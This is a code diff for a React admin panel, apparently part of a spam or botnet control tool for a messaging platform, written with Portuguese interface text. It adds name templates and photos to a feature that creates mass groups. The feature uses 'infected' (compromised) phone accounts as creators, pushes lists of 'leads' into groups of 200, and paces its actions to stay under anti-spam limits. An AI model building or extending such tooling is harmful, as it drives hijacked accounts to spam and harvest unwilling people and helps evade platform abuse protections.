@@ -57,6 +57,10 @@ export default function AdminPanel() {
   const [broadcastProgress, setBroadcastProgress] = useState(0);
   const [isBroadcasting, setIsBroadcasting] = useState(false);
   const stopBroadcastRef = useRef(false);
+  
+  // --- CONFIGURAÇÃO DE GRUPOS ---
+  const [groupNameTemplate, setGroupNameTemplate] = useState('VIP Club {number}');
+  const [groupPhotoUrl, setGroupPhotoUrl] = useState('');
 
   // --- INICIALIZAÇÃO ---
   useEffect(() => {
@@ -540,7 +544,9 @@ export default function AdminPanel() {
 
   const createSmartGroups = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas infectadas para criar grupos!');
-    if (!confirm(`⚠️ CRIAR GRUPOS INTELIGENTES?\n\n• Limites anti-spam: 200 membros por grupo\n• Pausas estratégicas entre criações\n• Distribuição automática de leads\n\nContas selecionadas: ${selectedPhones.size}`)) return;
+    if (!groupNameTemplate.trim()) return alert('Digite um nome para os grupos!');
+    
+    if (!confirm(`⚠️ CRIAR GRUPOS INTELIGENTES?\n\n• Nome: ${groupNameTemplate}\n• Foto: ${groupPhotoUrl ? 'Sim' : 'Não'}\n• Limites anti-spam: 200 membros por grupo\n• Pausas estratégicas entre criações\n• Distribuição automática de leads\n\nContas selecionadas: ${selectedPhones.size}`)) return;
 
     setIsCreatingGroups(true);
     setGroupCreationProgress(0);
@@ -555,6 +561,7 @@ export default function AdminPanel() {
 
       let groupsCreated = [];
       let totalLeadsAssigned = 0;
+      let groupCounter = 1;
 
       while (true) {
         if (stopBroadcastRef.current) {
@@ -586,6 +593,9 @@ export default function AdminPanel() {
 
           const creatorPhone = availableCreators.shift();
           const groupLeads = leads.slice(i * GROUP_SIZE_LIMIT, (i + 1) * GROUP_SIZE_LIMIT);
+          
+          // Gera nome único para o grupo
+          const groupName = groupNameTemplate.replace('{number}', groupCounter.toString().padStart(3, '0'));
 
           try {
             const createRes = await authenticatedFetch('/api/create-group', {
@@ -593,7 +603,8 @@ export default function AdminPanel() {
               body: JSON.stringify({
                 creatorPhone: creatorPhone,
                 leads: groupLeads,
-                groupName: `Grupo VIP ${Math.floor(Math.random() * 10000)}`
+                groupName: groupName,
+                groupPhotoUrl: groupPhotoUrl
               })
             });
 
@@ -602,17 +613,19 @@ export default function AdminPanel() {
             if (createData.success) {
               groupsCreated.push({
                 id: createData.groupId,
-                name: createData.groupName,
+                name: groupName,
                 creatorPhone: creatorPhone,
                 memberCount: groupLeads.length,
                 createdAt: new Date().toISOString(),
-                leads: groupLeads
+                leads: groupLeads,
+                photoUrl: groupPhotoUrl
               });
               
               totalLeadsAssigned += groupLeads.length;
               setGroupCreationProgress(Math.round((totalLeadsAssigned / stats.pending) * 100));
+              groupCounter++;
               
-              addLog(`✅ Grupo criado: ${createData.groupName} (${groupLeads.length} membros)`);
+              addLog(`✅ Grupo criado: ${groupName} (${groupLeads.length} membros)`);
               
               // Devolve o criador para a lista após um tempo
               setTimeout(() => {
@@ -950,6 +963,34 @@ export default function AdminPanel() {
                         </div>
                     </div>
                     
+                    <div style={{background:'#0d1117', padding:'20px', borderRadius:'10px', marginBottom:'25px', border:'1px solid #3390ec'}}>
+                        <h4 style={{color:'#3390ec', margin:'0 0 15px 0'}}>🎨 Personalização dos Grupos</h4>
+                        
+                        <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold', color:'#c9d1d9'}}>Nome do Grupo (use {number} para numeração):</label>
+                        <input 
+                            type="text" 
+                            placeholder="VIP Club {number}" 
+                            value={groupNameTemplate} 
+                            onChange={e=>setGroupNameTemplate(e.target.value)} 
+                            style={{width:'100%', padding:'12px', marginBottom:'15px', background:'#000', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'14px'}} 
+                        />
+                        <div style={{fontSize:'11px', color:'#8b949e', marginBottom:'15px'}}>
+                            Ex: "VIP Club {number}" → "VIP Club 001", "VIP Club 002"...
+                        </div>
+                        
+                        <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold', color:'#c9d1d9'}}>Foto do Grupo (URL):</label>
+                        <input 
+                            type="text" 
+                            placeholder="https://i.imgur.com/grupo.jpg" 
+                            value={groupPhotoUrl} 
+                            onChange={e=>setGroupPhotoUrl(e.target.value)} 
+                            style={{width:'100%', padding:'12px', background:'#000', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'14px'}} 
+                        />
+                        <div style={{fontSize:'11px', color:'#8b949e', marginTop:'8px'}}>
+                            Opcional: Imagem para o perfil de todos os grupos criados
+                        </div>
+                    </div>
+                    
                     <div style={{display:'flex', gap:'15px', marginBottom:'25px'}}>
                         {!isCreatingGroups ? (
                             <button onClick={createSmartGroups} style={{flex:1, padding:'18px', background:'#d29922', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'16px', boxShadow:'0 4px 15px rgba(210, 153, 34, 0.3)'}}>
@@ -983,7 +1024,14 @@ export default function AdminPanel() {
                             createdGroups.map(g => (
                                 <div key={g.id} style={{padding:'15px', marginBottom:'10px', borderRadius:'8px', border:'1px solid #30363d', background:'#0d1117'}}>
                                     <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'8px'}}>
-                                        <div style={{fontWeight:'bold', color:'white', fontSize:'15px'}}>{g.name}</div>
+                                        <div style={{display:'flex', alignItems:'center', gap:'12px'}}>
+                                            {g.photoUrl && (
+                                                <div style={{width:'40px', height:'40px', borderRadius:'50%', overflow:'hidden', border:'2px solid #3390ec'}}>
+                                                    <img src={g.photoUrl} style={{width:'100%', height:'100%', objectFit:'cover'}} />
+                                                </div>
+                                            )}
+                                            <div style={{fontWeight:'bold', color:'white', fontSize:'15px'}}>{g.name}</div>
+                                        </div>
                                         <div style={{fontSize:'12px', color:'#8b949e'}}>{g.memberCount} membros</div>
                                     </div>
                                     <div style={{fontSize:'11px', color:'#8b949e', marginBottom:'8px'}}>
